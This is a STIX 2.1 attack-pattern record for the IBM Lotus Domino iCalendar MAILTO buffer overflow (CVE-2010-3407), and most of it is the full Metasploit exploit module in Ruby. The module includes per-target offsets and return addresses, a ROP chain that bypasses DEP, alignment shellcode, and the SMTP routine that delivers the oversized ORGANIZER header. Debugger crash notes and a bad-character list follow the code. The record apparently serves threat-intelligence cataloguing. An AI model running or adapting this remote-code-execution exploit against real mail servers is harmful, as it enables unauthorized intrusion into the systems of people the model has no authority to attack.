{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b122d042-0d97-41be-828d-8182eced33b1",
    "created": "2024-08-14T16:47:55.756311Z",
    "modified": "2024-08-14T16:47:55.756315Z",
    "name": "\"IBM Lotus Domino iCalendar MAILTO Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in IBM Lotus Domino iCalendar.  By sending a long string of data as the \"ORGANIZER;mailto\" header, process \"nRouter.exe\" crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to gain arbitrary code execution.  Note: In order to trigger the vulnerable code path, a valid Domino mailbox account is needed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lotus/domino_icalendar_organizer.rb",
            "external_id": "domino_icalendar_organizer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3407"
        },
        {
            "source_name": "reference",
            "url": "http://labs.mwrinfosecurity.com/advisories/lotus_domino_ical_stack_buffer_overflow/"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?rs=475&uid=swg21446515"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Lotus Domino iCalendar MAILTO Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in IBM Lotus Domino iCalendar.  By\n        sending a long string of data as the \"ORGANIZER;mailto\" header, process \"nRouter.exe\"\n        crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to\n        gain arbitrary code execution.\n\n        Note: In order to trigger the vulnerable code path, a valid Domino mailbox account\n        is needed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'A. Plaskett',  #Initial discovery, poc\n          'sinn3r'        #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3407' ],\n          [ 'OSVDB', '68040' ],\n          [ 'ZDI', '10-177' ],\n          [ 'URL', 'http://labs.mwrinfosecurity.com/advisories/lotus_domino_ical_stack_buffer_overflow/' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?rs=475&uid=swg21446515' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => [*(0x00..0x08)].pack(\"C*\") + [*(0x10..0x18)].pack(\"C*\") + [*(0x1a..0x1f)].pack(\"C*\") + \"\\x2c\" + [*(0x80..0xff)].pack(\"C*\"),\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' => {'BufferRegister'=>'ECX'},\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Lotus Domino 8.5 on Windows 2000 SP4',\n            {\n              'Offset'    => 2374,           #Offset to EIP\n              'Ret'       => 0x6030582B,     #JMP ECX\n              'MaxBuffer' => 9010            #Total buffer size\n            }\n          ],\n          [\n            'Lotus Domino 8.5 on Windows Server 2003 SP0',\n            {\n              'Offset'    => 2374,           #Offset to EIP\n              'Ret'       => 0x6030582B,     #JMP ECX (Domino\\\\nnotes.dll)\n              'MaxBuffer' => 9010            #Total buffer size\n            }\n          ],\n          [\n            'Lotus Domino 8.5 on Windows Server 2003 SP2',\n            {\n              'Offset'    => 2374,           #Offset to EIP\n              'Ret'       => 0x604C4222,     #ADD AL,0x5E ; RETN\n              'EAX'       => 0x7C35287F,     #Initial CALL VirtualProtect addr to align (MSVCR71.dll)\n              'EaxOffset' => 2342,           #Offset to EAX\n              'RopOffset' => 24,             #Offset to ROP gadgets\n              'MaxBuffer' => 9010            #Total buffer size\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-09-14',\n      'DefaultTarget'  => 2))\n\n      register_options(\n        [\n          Opt::RPORT(25),\n          OptString.new('MAILFROM', [true, 'Valid Lotus Domino mailbox account', '']),\n          OptString.new('MAILTO',   [true, 'Valid Lotus Domino mailbox account', ''])\n        ])\n  end\n\n  def check\n    connect\n    banner = (sock.get_once(-1,5) || '').chomp\n    disconnect\n\n    if banner =~ /Lotus Domino Release 8\\.5/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    sploit = ''\n    if target.name =~ /Windows 2000 SP4/\n\n      sploit << rand_text_alpha(934)\n      sploit << payload.encoded\n      sploit << rand_text_alpha((target['Offset']-sploit.length))\n      sploit << [target.ret].pack('V')\n      sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))\n\n    elsif target.name =~ /Server 2003 SP0/\n\n      sploit << rand_text_alpha(930)\n      sploit << payload.encoded\n      sploit << rand_text_alpha((target['Offset']-sploit.length))\n      sploit << [target.ret].pack('V')\n      sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))\n\n    elsif target.name =~ /Server 2003 SP2/\n\n      #Borrow a \"CALL VirtualProtect()\" in Domino's MSVCR71.dll to bypass DEP\n      #shellcode max = 1312 bytes\n      rop_gadgets =\n      [\n        #EAX should be aligned to CALL VirtualProtect at this point\n        0x604F5728,  #MOV DWORD PTR DS:[ECX],EAX; RETN (nnotes.dll)\n        #Set shellcode address\n        0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)\n        0x62454F32,  #ADD AL,2B; RETN (nlsccstr.dll)\n        0x603F7B38,  #ADD AL,31; RETN (nnotes.dll)\n        0x624B7040,  #MOV DWORD PTR DS:[ECX+4],EAX; RETN (nnotes.dll)\n        #Set RETN value\n        0x60577B7A,  #XCHG EAX,EDX; RETN (nnotes.dll)\n        0x62452E35,  #MOV EAX,ECX; RETN (nlsccstr.dll)\n        0x60606F4E,  #ADD AL,5D; RETN (nlsccstr.dll)\n        0x603E6260,  #DEC EAX; RETN (nnotes.dll)\n        0x603E6260,  #DEC EAX; RETN (nnotes.dll)\n        0x603E6260,  #DEC EAX; RETN (nnotes.dll)\n        0x603E6260,  #DEC EAX; RETN (nnotes.dll)\n        0x603E6260,  #DEC EAX; RETN (nnotes.dll)\n        0x7C3A4C72,  #MOV DWORD PTR DS:[EAX],EDX; RETN (msvcp71.dll)\n        0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)\n        0x60253B6D,  #XCHG EAX,EBP; RETN (nnotes.dll)\n        #Set Size (0x413)\n        0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll)\n        0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll)\n        0x60592A36,  #ADD EAX,107; RETN (nnotes.dll)\n        0x603B4C27,  #ADD AL,2B; RETN (nnotes.dll)\n        0x624B7044,  #MOV DWORD PTR DS:[ECX+8],EAX; RETN\n        0x604C5225,  #XOR EAX, EAX; RETN\n        #newProtect\n        0x60386C3C,  #MOV AL,3B; RETN (nnotes.dll)\n        0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)\n        0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)\n        0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)\n        0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)\n        0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)\n        0x624B7048,  #MOV DWORD PTR DS:[ECX+C],EAX; RETN\n        #oldProtect\n        0x602B7353,  #MOV EAX,ESI; POP ESI; RETN (nnotes.dll)\n        0x41414141,  #ESI\n        0x624B704C,  #MOV DWORD PTR DS:[ECX+10],EAX; RETN (nlsccstr.dll)\n        #Call VirtualProtect\n        0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)\n        0x60276256,  #XCHG EAX,ESP; RETN (nnotes.dll)\n      ].pack(\"V*\")\n\n      align  = \"\\x51\"      #PUSH ECX\n      align << \"\\x58\"      #POP EAX\n      align << \"\\x34\\x43\"  #XOR AL,43\n      align << \"\\x40\"      #INC EAX\n      align << \"\\x34\\x65\"  #XOR AL,65\n      align << \"\\x50\"      #PUSH EAX\n      align << \"\\x59\"      #POP ECX\n\n      sploit << rand_text_alpha(1022)\n      sploit << align\n      sploit << payload.encoded\n      sploit << rand_text_alpha((target['EaxOffset']-sploit.length))\n      sploit << [target['EAX']].pack('V')\n      sploit << rand_text_alpha((target['Offset']-sploit.length))\n      sploit << [target.ret].pack('V')\n      sploit << rand_text_alpha((target['RopOffset']))\n      sploit << rop_gadgets\n      sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))\n\n    end\n\n    fname   = rand_text_alpha(4)\n    prod_id = rand_text_alpha_upper(5) + \"@\" + rand_text_alpha_upper(13) + \"@\" + rand_text_alpha_upper(24)\n    uid     = rand_text_alpha_upper(15)\n    summary = rand_text_alpha_upper(5) + \"@\" + rand_text_alpha_upper(11)\n    status  = rand_text_alpha_upper(4)\n\n    body  = \"Content-Type: text/calendar; method=COUNTER; charset=UTF-8\\r\\n\"\n    body << \"#{fname}.txt\\r\\n\"\n    body << \"MIME-Version: 1.0\\r\\n\"\n    body << \"Content-Transfer-Encoding: 8bit\\r\\n\"\n    body << \"BEGIN:VCALENDAR\\r\\n\"\n    body << \"METHOD:COUNTER\\r\\n\"\n    body << \"PRODID:-//#{prod_id}//\\r\\n\"\n    body << \"VERSION:2.0\\r\\n\"\n    body << \"BEGIN:VEVENT\\r\\n\"\n    body << \"UID:#{uid}\\r\\n\"\n    body << \"SEQ:2\\r\\n\"\n    body << \"RRULE:aaaa\\r\\n\"\n    body << \"ORGANIZER:mailto:H@#{sploit}.com\\r\\n\"\n    body << \"ATTENDEE;:Mailto:#{datastore['MAILTO']}\\r\\n\"\n    body << \"SUMMARY:#{summary}\\r\\n\"\n    body << \"DTSTART:20091130T093000Z\\r\\n\"\n    body << \"DTEND:20091130T093000Z\\r\\n\"\n    body << \"DTSTAMP:20091130T083147Z\\r\\n\"\n    body << \"LOCATION:Location\\r\\n\"\n    body << \"STATUS:#{status}\\r\\n\"\n    body << \"END:VEVENT\\r\\n\"\n    body << \"END:VCALENDAR\\r\\n\"\n    body << \"\\r\\n.\\r\\n\"\n\n    commands =\n    {\n      :HELO => \"HELO localhost\\r\\n\",\n      :FROM => \"MAIL FROM: <#{datastore['MAILFROM']}>\\r\\n\",\n      :RCPT => \"RCPT TO: <#{datastore['MAILTO']}>\\r\\n\",\n      :DATA => \"DATA\\r\\n\",\n      :MESG => body,\n      :QUIT => \"QUIT\\r\\n\",\n    }\n\n    print_status(\"Trying target #{target.name}\")\n\n    connect\n\n    # Get SMTP Banner\n    res = (sock.get_once || '').chomp\n    print_status(\"Banner: #{res}\")\n\n    # Check banner before trying the exploit\n    if res !~ /Lotus Domino Release 8.5/\n      print_error(\"Remote service does not seem to be Lotus Domino 8.5\")\n      disconnect\n      return\n    end\n\n    # Send HELO\n    sock.put(commands[:HELO])\n    res = sock.get_once || ''\n    print_status(\"Received: #{res.chomp}\")\n\n    # Set MAIL FROM\n    sock.put(commands[:FROM])\n    res = sock.get_once || ''\n    print_status(\"Received: #{res.chomp}\")\n\n    # Set RCPT\n    sock.put(commands[:RCPT])\n    res = sock.get_once || ''\n    print_status(\"Received: #{res.chomp}\")\n\n    # Set DATA\n    sock.put(commands[:DATA])\n    res = sock.get_once || ''\n    print_status(\"Received: #{res.chomp}\")\n\n    # Send malicious data\n    sock.put(commands[:MESG])\n    res = sock.get_once\n\n    # QUIT\n    sock.put(commands[:QUIT])\n    res = sock.get_once || ''\n    print_status(\"Received: #{res.chomp}\")\n\n    handler\n    disconnect\n  end\nend\n\n\n=begin\n0:008> r\neax=41414141 ebx=00000004 ecx=08da9700 edx=08dab695 esi=06c248bc edi=00000014\neip=42424242 esp=08da9cc0 ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206\n42424242 ??              ???\n0:008> !exchain\n08daea2c: nRouter+511bb (004511bb)\n08daffdc: kernel32!_except_handler3+0 (77e70abc)\n  CRT scope  0, filter: kernel32!BaseThreadStart+3a (77e4a92d)\n                func:   kernel32!BaseThreadStart+4b (77e4a943)\nInvalid exception stack at ffffffff\n0:008> k\nChildEBP RetAddr\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n08da9cbc 43434343 0x42424242\n08da9cc0 43434343 0x43434343\n...\n0:008> bl\n 0 e 602738f9     0001 (0001)  0:**** nnotes!MailCheck821Address+0xb09\n0:008> u 602738f9\nnnotes!MailCheck821Address+0xb09:\n602738f9 e80239d9ff      call    nnotes!Cstrcpy (60007200)\n602738fe eb02            jmp     nnotes!MailCheck821Address+0xb12 (60273902)\n60273900 33ff            xor     edi,edi\n60273902 8d8dc0faffff    lea     ecx,[ebp-540h]\n60273908 51              push    ecx\n60273909 8d95bcf6ffff    lea     edx,[ebp-944h]\n6027390f 52              push    edx\n60273910 e8eb38d9ff      call    nnotes!Cstrcpy (60007200)\n\nBadchars:\n0x01=0x0F21, 0x02=0x0f22,  0x03=0x0f23, 0x04=0x0f24, 0x05=0x0f25,  0x06=0x0f26, 0x07=0x0f27\n0x08=0x0f28, 0x0a=nocrash, 0x0b=0x0f2b, 0x0c=0x0f2c, 0x0d=nocrash, 0x0e=0x0f2e  0x0f=0x0f2f,\n0x10=0x0f30, 0x11=0x0f31,  0x12=0x0f32, 0x13=0x0f33, 0x14=0x0f34,  0x15=0x0f35, 0x16=0x0f36,\n0x17=0x0f37, 0x18=0x0f38,  0x1a=0x0f3a, 0x1b=0x0f3b, 0x1c=0x0f3c,  0x1d=0x0f3d, 0x1e=0x0f3e,\n0x1f=0x0f3f, 0x2c=nocrash, 0x80..0xff = \"\"\n=end\n",
    "x_mitre_disclosure_date": "2010-09-14",
    "x_mitre_platforms": [
        "win'"
    ]
}